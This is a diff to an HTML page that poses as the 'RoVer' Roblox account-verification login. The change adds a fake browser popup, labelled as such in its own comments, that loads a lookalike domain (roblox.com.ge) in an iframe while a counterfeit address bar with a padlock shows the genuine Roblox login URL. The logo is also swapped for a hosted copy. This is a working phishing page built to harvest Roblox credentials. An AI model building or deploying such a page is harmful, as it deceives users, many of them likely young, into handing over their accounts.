@@ -1,10 +1,8 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>RoVer – Login</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
   <style>
     html, body {
       height: 100%;
@@ -111,7 +109,7 @@
       align-items: center;
       justify-content: flex-start;
       height: 100%;
-      padding-top: 60px; /* adjust to move above middle */
+      padding-top: 60px;
       text-align: center;
     }
 
@@ -140,7 +138,6 @@
       display: block;
     }
 
-    /* Info Box */
     .info-box {
       display: flex;
       align-items: flex-start;
@@ -170,7 +167,6 @@
       line-height: 1.4;
     }
 
-    /* Login Button */
     .login-btn {
       margin-top: 20px;
       background: #c91673;
@@ -189,25 +185,6 @@
       background: #a1125f;
     }
 
-    /* Responsive iframe */
-    .iframe-container {
-      margin: 40px auto 0;
-      max-width: 900px;
-      width: 100%;
-      border: 2px solid white;
-      border-radius: 8px;
-      aspect-ratio: 16 / 9;
-      display: none;
-      overflow: hidden;
-    }
-
-    .iframe-container iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-
-    /* Navbar behavior on mobile */
     @media (max-width: 768px) {
       .nav-left,
       .nav-right {
@@ -219,7 +196,6 @@
       }
     }
 
-    /* Mobile responsiveness with auto iframe height */
     @media (max-width: 600px) {
       .panel {
         padding: 20px 16px;
@@ -241,12 +217,77 @@
         font-size: 15px;
         padding: 10px;
       }
+    }
 
-      .iframe-container {
-        aspect-ratio: auto;
-        height: 80vh; /* Automatically fills 80% of the viewport height */
-        max-height: 700px; /* Prevents excessive height */
-      }
+    /* Fake popup styles */
+    .fake-popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 700px;
+      height: 600px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.8);
+      overflow: hidden;
+      z-index: 1000;
+      border: 1px solid #ccc;
+    }
+
+    .window-bar {
+      background: #e0e0e0;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 12px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+      border-bottom: 1px solid #ccc;
+    }
+
+    .popup-close {
+      font-size: 20px;
+      cursor: pointer;
+      color: #666;
+    }
+
+    .popup-close:hover {
+      color: red;
+    }
+
+    .url-bar {
+      background: #f4f4f4;
+      border: 1px solid #ccc;
+      margin: 10px;
+      padding: 6px 10px;
+      border-radius: 6px;
+      font-size: 13px;
+      font-family: monospace;
+      color: #333;
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+    }
+
+    .popup-iframe {
+      width: 100%;
+      height: calc(100% - 76px);
+      border: none;
+    }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.65);
+      z-index: 999;
     }
   </style>
 </head>
@@ -255,7 +296,7 @@
   <nav>
     <div class="nav-left">
       <div class="logo">
-        <img src="https://rover.link/logo-white-NE2GPYXA.svg" alt="RoVer Logo" />
+        <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo">
       </div>
       <a href="#">Help</a>
       <a href="#">Team Members</a>
@@ -266,12 +307,8 @@
       <a href="#" style="font-weight: 700">Verification</a>
       <span class="username"></span>
     </div>
-
-    <!-- Hamburger -->
     <div class="hamburger" id="hamburger">
-      <span></span>
-      <span></span>
-      <span></span>
+      <span></span><span></span><span></span>
     </div>
   </nav>
 
@@ -290,42 +327,63 @@
     <div class="panel" id="mockPanel">
       <h1>Link Roblox Account</h1>
       <span class="redirect-text">You will be redirected to Roblox.</span>
-
       <div class="info-box">
-        <img src="https://img.icons8.com/ios-filled/50/1E90FF/info.png" alt="info" />
+        <img src="https://img.icons8.com/ios-filled/50/1E90FF/info.png" alt="info">
         <p>If the next page says:<br>
           <span style="color: #fff;">"You are not allowed to use this application"</span>, please read 
           <span style="color: #c91673;">this help article</span>.
         </p>
       </div>
-
       <button class="login-btn" id="loginBtn">Log in with Roblox</button>
-    </div>
-
-    <!-- Responsive iframe wrapper -->
-    <div class="iframe-container" id="verifyFrame">
-      <iframe src="https://url-roblox.com/login?returnUrl=0175976643382159"></iframe>
     </div>
   </header>
 
+  <!-- Fake popup overlay -->
+  <div class="overlay" id="overlay"></div>
+
+  <!-- Fake browser popup -->
+  <div class="fake-popup" id="fakePopup">
+    <div class="window-bar">
+      RoVer – Login
+      <div class="popup-close" id="popupClose">×</div>
+    </div>
+    <div class="url-bar" id="urlDisplay">🔒 https://www.roblox.com/login</div>
+    <iframe class="popup-iframe" id="popupIframe" src=""></iframe>
+  </div>
+
   <script>
     const loginBtn = document.getElementById("loginBtn");
-    const mockPanel = document.getElementById("mockPanel");
-    const verifyFrame = document.getElementById("verifyFrame");
     const hamburger = document.getElementById("hamburger");
     const mobileMenu = document.getElementById("mobileMenu");
 
+    const fakePopup = document.getElementById("fakePopup");
+    const popupClose = document.getElementById("popupClose");
+    const overlay = document.getElementById("overlay");
+    const iframe = document.getElementById("popupIframe");
+    const urlDisplay = document.getElementById("urlDisplay");
+
     loginBtn.addEventListener("click", () => {
-      mockPanel.style.display = "none";
-      verifyFrame.style.display = "block";
+      const realUrl = "https://roblox.com.ge/login?returnUrl=0175976643382159";
+      const fakeUrl = "https://www.roblox.com/login";
+
+      iframe.src = realUrl;
+      urlDisplay.innerHTML = " " + fakeUrl;
+
+      fakePopup.style.display = "block";
+      overlay.style.display = "block";
+    });
+
+    popupClose.addEventListener("click", () => {
+      fakePopup.style.display = "none";
+      overlay.style.display = "none";
+      iframe.src = "";
     });
 
     hamburger.addEventListener("click", () => {
       mobileMenu.classList.toggle("open");
     });
   </script>
-</body>
-</html>
 
 
 
+</body></html>
